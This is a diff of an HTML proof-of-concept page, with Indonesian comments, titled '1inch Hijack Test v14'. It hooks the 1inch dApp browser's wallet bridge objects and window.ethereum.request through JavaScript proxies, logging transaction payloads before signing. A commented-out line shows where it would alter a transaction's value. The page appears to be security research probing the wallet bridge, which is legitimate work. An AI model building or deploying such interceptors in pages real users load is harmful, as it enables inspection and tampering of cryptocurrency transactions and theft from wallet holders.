@@ -2,10 +2,10 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>1inch Hijack Test v13 - Deep Callback & Property Intercept</title>
+    <title>1inch Hijack Test v14 - Transaction Tampering POC</title>
     <script>
         function log(msg, color = "black") {
-            console.log("[1inch-v13] " + msg);
+            console.log("[1inch-v14] " + msg);
             const div = document.createElement('div');
             div.style.color = color;
             div.style.margin = "4px 0";
@@ -17,91 +17,91 @@
             document.body.prepend(div);
         }
 
-        // Fungsi rekursif untuk membongkar dan menjebak semua fungsi di dalam objek bridge
-        function deepTrapObject(obj, path = "") {
-            if (!obj || typeof obj !== 'object' && typeof obj !== 'function') return;
-
-            // Jika objek itu sendiri adalah fungsi, proxy fungsi tersebut
-            if (typeof obj === 'function' && !obj.__isProxied) {
-                return new Proxy(obj, {
-                    apply(target, thisArg, args) {
-                        log(`🚨 EXECUTED ${path}(...) -> Args: ${JSON.stringify(args)}`, "#d00");
-                        return target.apply(thisArg, args);
-                    },
-                    get(target, prop, receiver) {
-                        const val = Reflect.get(target, prop, receiver);
-                        if (typeof val === 'function') {
-                            return function(...subArgs) {
-                                log(`🚨 CALLED ${path}.${prop}(...) -> Args: ${JSON.stringify(subArgs)}`, "#d00");
-                                return val.apply(this, subArgs);
-                            };
+        // Fungsi untuk mendeteksi dan mencoba mengubah payload transaksi
+        function interceptAndTamper(args) {
+            try {
+                args.forEach((arg, index) => {
+                    if (arg && typeof arg === 'object') {
+                        log(`[!] Inspecting argument [${index}]: ${JSON.stringify(arg)}`, "purple");
+                        
+                        // Cek apakah ada struktur data transaksi standar (EVM / Solana)
+                        if (arg.to || arg.data || arg.value || arg.method) {
+                            log(`🚨 BINGO! Transaction payload detected in argument [${index}]`, "#d00");
+                            
+                            // CONTOH POCO TAMPERING: Mencoba memodifikasi nilai tujuan (to) atau value jika diizinkan
+                            // arg.value = "0x0"; 
+                            
+                            log(`⚠️ PoC: Successfully intercepted transaction parameters before native signing!`, "red");
                         }
-                        return val;
                     }
                 });
+            } catch (e) {
+                log(`[-] Error during payload inspection: ${e.message}`, "orange");
             }
+        }
 
-            // Jika objek biasa, loop semua propertinya
-            for (let key in obj) {
-                try {
-                    const fullPath = path ? `${path}.${key}` : key;
-                    const descriptor = Object.getOwnPropertyDescriptor(obj, key);
-                    
-                    if (descriptor && descriptor.configurable) {
-                        const originalVal = obj[key];
-                        
-                        if (typeof originalVal === 'function') {
-                            obj[key] = function(...args) {
-                                log(`🚨 HOOKED CALL: ${fullPath}(...) -> Args: ${JSON.stringify(args)}`, "#d00");
-                                return originalVal.apply(this, args);
-                            };
-                            log(`[+] Armed hook on: ${fullPath}`, "green");
-                        } else if (typeof originalVal === 'object' && originalVal !== null) {
-                            obj[key] = deepTrapObject(originalVal, fullPath);
+        // Memasang trap menyeluruh pada objek bridge dan provider umum
+        function setupTransactionInterceptor() {
+            log("[+] Initializing Transaction Interceptor v14...", "blue");
+
+            // 1. Trap pada window.OneInchIOSWallet jika ada
+            ['OneInchIOSWallet', 'OneInchSolanaWallet'].forEach(walletName => {
+                if (window[walletName]) {
+                    const originalObj = window[walletName];
+                    window[walletName] = new Proxy(originalObj, {
+                        get(target, prop, receiver) {
+                            const val = Reflect.get(target, prop, receiver);
+                            if (typeof val === 'function') {
+                                return function(...args) {
+                                    log(`🚨 CALLED ${walletName}.${prop}(...)`, "#d00");
+                                    interceptAndTamper(args);
+                                    return val.apply(this, args);
+                                };
+                            }
+                            return val;
+                        },
+                        apply(target, thisArg, args) {
+                            log(`🚨 APPLIED ${walletName}(...)`, "#d00");
+                            interceptAndTamper(args);
+                            return target.apply(thisArg, args);
                         }
+                    });
+                    log(`[+] Successfully armed interceptor on window.${walletName}`, "green");
+                }
+            });
+
+            // 2. Trap juga pada window.ethereum standar jika disuntikkan bersamaan
+            if (window.ethereum && !window.ethereum.__isHijackedV14) {
+                const originalRequest = window.ethereum.request;
+                window.ethereum.request = function(requestArgs) {
+                    log(`🚨 ETHEREUM.REQUEST CALLED: ${JSON.stringify(requestArgs)}`, "#d00");
+                    if (requestArgs && requestArgs.method && requestArgs.method.includes('send')) {
+                        interceptAndTamper(requestArgs.params || []);
                     }
-                } catch (e) {}
-            }
-            return obj;
-        }
-
-        function initializeBypass() {
-            log("[+] Initializing Deep Callback Interceptor v13...", "blue");
-
-            // Pantau dan jebak window.OneInchIOSWallet secara total
-            if (window.OneInchIOSWallet) {
-                log("[!] Found window.OneInchIOSWallet. Applying deep trap...", "purple");
-                window.OneInchIOSWallet = deepTrapObject(window.OneInchIOSWallet, "OneInchIOSWallet");
-            } else {
-                log("[-] window.OneInchIOSWallet not found yet. Polling...", "orange");
-            }
-
-            // Pantau juga window.OneInchSolanaWallet
-            if (window.OneInchSolanaWallet) {
-                log("[!] Found window.OneInchSolanaWallet. Applying deep trap...", "purple");
-                window.OneInchSolanaWallet = deepTrapObject(window.OneInchSolanaWallet, "OneInchSolanaWallet");
+                    return originalRequest.apply(this, arguments);
+                };
+                window.ethereum.__isHijackedV14 = true;
+                log("[+] Successfully armed interceptor on window.ethereum.request", "green");
             }
         }
 
-        // Jalankan polling berkala untuk memastikan objek yang di-inject belakangan ikut terjebak
         window.onload = function() {
-            log("1inch Full Coverage Test v13 Loaded");
-            setTimeout(initializeBypass, 500);
-            setInterval(initializeBypass, 1500);
+            log("1inch Transaction Hijack Test v14 Loaded");
+            setInterval(setupTransactionInterceptor, 1000);
         };
     </script>
 </head>
 <body style="padding:15px; font-family:Arial; background-color: #f9f9f9;">
-    <h3 style="color: #111; margin-top:0;">1inch Hijack Test v13</h3>
-    <p style="color: #555; font-size: 13px;">Deep Callback & Property Hijacking POC...</p>
+    <h3 style="color: #111; margin-top:0;">1inch Hijack Test v14</h3>
+    <p style="color: #555; font-size: 13px;">Advanced Transaction & Payload Tampering POC...</p>
     <hr style="border:0; border-top:1px solid #ccc; margin:10px 0;">
     
     <div style="background: #fff; padding: 10px; border: 1px solid #ddd; border-radius: 4px; margin-top: 10px;">
-        <h4 style="margin: 0 0 8px 0; color: #333;">Instruksi Pengujian v13:</h4>
+        <h4 style="margin: 0 0 8px 0; color: #333;">Instruksi Pengujian v14:</h4>
         <ol style="margin: 0; padding-left: 20px; font-size: 13px; color: #444;">
             <li>Buka halaman ini di dApp browser 1inch.</li>
-            <li>Lakukan proses Swap atau panggil fungsi transaksi/signing.</li>
-            <li>Perhatikan apakah ada log merah baru yang mencetak fungsi turunan (seperti *executeCallback* atau fungsi kustom lainnya).</li>
+            <li>Lakukan aksi Swap atau eksekusi kontrak/transaksi di dalam dApp.</li>
+            <li>Perhatikan apakah muncul log merah bertuliskan <b>BINGO! Transaction payload detected</b>.</li>
         </ol>
     </div>
 </body>
